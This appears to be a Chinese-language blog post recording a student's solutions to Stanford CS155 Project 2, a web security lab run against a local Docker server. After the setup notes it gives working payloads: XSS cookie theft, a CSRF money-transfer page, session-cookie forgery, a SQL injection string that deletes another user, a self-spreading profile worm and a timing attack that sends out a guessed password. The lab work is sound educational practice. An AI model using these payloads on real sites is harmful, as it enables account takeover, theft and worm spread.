---
title: CS155 Project2 实验记录
date: 2023-04-06 22:58:47
tags: 网络安全
---

## 下载说明等文档

来自 [cs155 Spring2022](https://cs155.github.io/Spring2022/)。

```bash
curl -O https://cs155.github.io/Spring2022/hw_and_proj/proj2/proj2.pdf
curl -O https://cs155.github.io/Spring2022/hw_and_proj/proj2/proj2.zip
```

## 实验环境搭建

实验在 VMware 上进行，使用的 Linux 发行版为 Ubuntu 22.04 Server。

docker 的安装参考[官方文档](https://docs.docker.com/engine/install/ubuntu/)

依次执行:

```bash
unzip proj2.zip -d proj2/
cd proj2
bash build_image.sh
bash start_server.sh
```

通过 `ifconfig` 或 `ip addr show` 找到虚拟机的 ip，然后就可以在主机的浏览器上访问了。

### npm install 失败

```text
 => ERROR [4/5] RUN npm install                                                                                             561.5s
------
 > [4/5] RUN npm install:
#0 321.1 npm ERR! network timeout at: https://registry.npmjs.org/babel-cli
#0 561.5
#0 561.5 npm ERR! A complete log of this run can be found in:
#0 561.5 npm ERR!     /root/.npm/_logs/2023-04-06T13_43_13_637Z-debug.log
------
Dockerfile:12
--------------------
  10 |     # where available (npm@5+)
  11 |
  12 | >>> RUN npm install
  13 |
  14 |     # Bundle app source
--------------------
ERROR: failed to solve: process "/bin/sh -c npm install" did not complete successfully: exit code: 1
```

发现手动 `curl https://registry.npmjs.org/babel-cli` 是可以连上的。推测是 docker 的问题。于是在 Dockerfile 中加入下面一行进行测试:

```text
RUN curl https://registry.npmjs.org/babel-cli
```

得到报错:

```text
curl: (6) Could not resolve host: registry.npmmirror.com
```

推测为 DNS 问题。找到一篇 [CSDN 博客](https://blog.csdn.net/lennSUIkA/article/details/80157427)。

参考[官方文档](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-configuration-file)，修改 /etc/docker/daemon.json 添加 dns 服务器。

该地址通过 `resolvectl status | grep DNS` 查看。

```json
{
    "dns": ["192.168.43.2"]
}
```

修改后，重启 docker 服务即可。

```bash
systemctl daemon-reload
systemctl restart docker
```

### 挂起虚拟机后重新打开无法访问容器

不懂，遇事不决 `systemctl restart docker`。

## 攻击实验

### Cookie Theft

看源码，views/profile/view.ejs 里，直接把 errorMsg 塞进了 Html 文本里，而 router.js 里这个错误信息是这样定义的:

```js
`${req.query.username} does not exist!`
```

也就是说，我们要构造字符串替换掉下面的 username 部分

```html
<p class='error'> ${req.query.username} does not exist! </p>
```

前面的标签让它闭合，后面的标签让它隐藏，中间塞脚本就行。答案如下

```js
</p>
<script>
let cke = document.cookie;
let url = `steal_cookie?cookie=${cke}`;
let xhr = new XMLHttpRequest();
xhr.open("GET", url);
xhr.send();
</script>
<p style="display:none">
```

### Cross-Site Request Forgery

edge 和 chrome 的同源策略都太严格了，所以这个实验我用的 IE。

F12 抓包，模仿他的表头发 Post 就行。

恶意网页如下:

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Bad Website!</title>
        <script>
            let xhr = new XMLHttpRequest();
            xhr.open("POST", "http://192.168.43.134:3000/post_transfer");
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.withCredentials = true;
            xhr.send("destination_username=user1&quantity=10");
            window.location.replace("https://www.baidu.com");
        </script>
    </head>
    <body>
        <p>Hello World!</p>
    </body>
</html>
```

登录网页后打开这个恶意页面会往 user1 发 10 块钱然后导到百度。

### Session Hijacking with Cookies

看源码 app.js，用的 [cookie-session](https://github.com/expressjs/cookie-session/blob/master/index.js)，而且压根没加密。把 cookie 里的 session 弄出来直接通过 base64 解码就是 json 了，然后直接改就完事了。改完给它塞回去。

取 cookie 的前面大段 docCookie 我是从 [MDN](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie) 上直接抄的。其实直接用 substr 截取字符串也是一样的。

如果 profile 里有奇奇怪怪的特殊字符可能会在解码的时候出岔子？算了，题目没在乎这个。

```js
var docCookies = {
    getItem: function (sKey) {
        return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
    },
    setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
        if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
        var sExpires = "";
        if (vEnd) {
            switch (vEnd.constructor) {
                case Number:
                    sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
                    break;
                case String:
                    sExpires = "; expires=" + vEnd;
                    break;
                case Date:
                    sExpires = "; expires=" + vEnd.toUTCString();
                    break;
            }
        }
        document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
        return true;
    },
    removeItem: function (sKey, sPath, sDomain) {
        if (!sKey || !this.hasItem(sKey)) { return false; }
        document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "");
        return true;
    },
    hasItem: function (sKey) {
        return (new RegExp("(?:^|;\\s*)" + encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") + "\\s*\\=")).test(document.cookie);
    },
    keys: /* optional method: you can safely remove it! */ function () {
        var aKeys = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/);
        for (var nIdx = 0; nIdx < aKeys.length; nIdx++) { aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); }
        return aKeys;
    }
};

let ses = docCookies.getItem("session");
let info_s = b64_to_utf8(ses);
let info = JSON.parse(info_s);

console.log(info_s);

info.account.username = "user1";
info_s = JSON.stringify(info);
ses = utf8_to_b64(info_s);

console.log(info_s);

document.cookie = "session=" + ses;
```

### Cooking the Books with Cookies

看源码 router.js，会发现它在更新数据的时候原数目是直接从 session 里取的

```js
req.session.account.bitbars -= amount;
query = `UPDATE Users SET bitbars = "${req.session.account.bitbars}" WHERE username == "${req.session.account.username}";`;
await db.exec(query);
```

所以你直接对 cookie 改动，然后随便 trans 一下，这个东西就写到数据库里了。

答案如下，基本跟上一个是一样的

```js
var docCookies = {
    ...
};
let ses = docCookies.getItem("session");
let info_s = atob(ses);
let info = JSON.parse(info_s);
info.account.bitbars = 1000000000;
info_s = JSON.stringify(info);
ses = btoa(info_s);
document.cookie = "session=" + ses;
```

### SQL Injection

看源码 router.js，代码

```js
const query = `DELETE FROM Users WHERE username == "${req.session.account.username}";`
await db.get(query);
```

要求删掉该用户时 user3 也会被删掉。关键在于如何让这个恶意用户也一起被删掉。

```text
user3" or username like "user3%
```

### Profile Worm

查看 Profile 时触发，观察源码，profile 的内容是插入到 html 里的，鉴定为 XSS 注入。

目标是传染，查询到被感染的 profile 会让自己的 profile 也变成这个，且 bitbars 显示为 10，并给攻击者发 1 块钱。

这个显示为 10，则是利用 id 的唯一性，在前面把 `bitbar_count` 这个 id 先占住。

接下来就是自我复制的问题了。直接把内容写进字符串里套娃是不可能的，那就只能复制显示出来的东西了。

看源码 views/pages/profile/view.ejs，发现这部分是有 id 的

```html
<% if (result.username && result.profile) { %>
    <div id="profile"><%- result.profile %></div>
<% } %>
```

利用这个 id 来复制内容就好了。

但是，直接从元素的 innerHTML 里搞出来的是没处理过的，里面会有一些像 `&` 或是奇怪的字符。需要处理一下。随便 update profile 一下观察一下，不难看出在提交表单时是转义过的（废话

参考万能的 [MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/encodeURI)，发起 post 请求的时候用 `encodeURIComponent()` 编码就行了。

cookie 里的 profile 改不改无所谓（虽然我还是改了），反正 logout 重进就出来了。

```html
<h3>You are infected!</h3>

<span id="bitbar_count" class="10" />

<script>
    // parse cookie
    let ses = document.cookie.slice(8);
    let info_s = atob(ses);
    let info = JSON.parse(info_s);
    // get profile and modify
    let prof = document.getElementById("profile").innerHTML;
    info.account.profile = prof;
    // encode again
    info_s = JSON.stringify(info);
    ses = btoa(info_s);
    document.cookie = "session=" + ses;
    // trans
    let xhr1 = new XMLHttpRequest();
    xhr1.open("POST", "post_transfer");
    xhr1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr1.send("destination_username=attacker&quantity=1");
    // upload profile to database
    let xhr2 = new XMLHttpRequest();
    xhr2.open("POST", "set_profile");
    xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr2.send("new_profile=" + encodeURIComponent(prof));
</script>
```

### Password Extraction via Timing Attack

最后这个是要你改 gamma\_starter.html 来进行一次侧信道攻击。

这个 on error 我没用过，随便试了试，大概就下面这样吧。总之，记下用时，取那个最离谱的就行。

```html
<span style='display:none'>
  <img id='test'/>
  <script>
    var dictionary = [`password`, `123456`, `12345678`, `dragon`, `1234`, `qwerty`, `12345`];
    var index = 0, ans = -1, ti = 0;
    var test = document.getElementById(`test`);
    test.onerror = () => {
      var end = new Date();

      /* >>>> HINT: you might want to replace this line with something else. */
      console.log(`Try ${dictionary[index - 1]}: Time elapsed ${end-start}`);
      if (ti < end - start) {
        ti = end - start;
        ans = index - 1;
      }
      /* <<<<< */

      start = new Date();
      if (index < dictionary.length) {
        /* >>>> TODO: replace string with login GET request */
        test.src = `http://192.168.43.134:3000/get_login?username=userx&password=${dictionary[index]}`;
        /* <<<< */
      } else {
        /* >>>> TODO: analyze server's reponse times to guess the password for userx and send your guess to the server <<<<< */
        let xhr = new XMLHttpRequest();
        xhr.open("GET", `http://192.168.43.134:3000/steal_password?password=${dictionary[ans]}&timeElapsed=${ti}`);
        xhr.send();
      }
      index += 1;
    };
    var start = new Date();
    /* >>>> TODO: replace string with login GET request */
    test.src = `http://192.168.43.134:3000/get_login?username=userx&password=${dictionary[index]}`;
    /* <<<< */
    index += 1;
  </script>
</span>

```
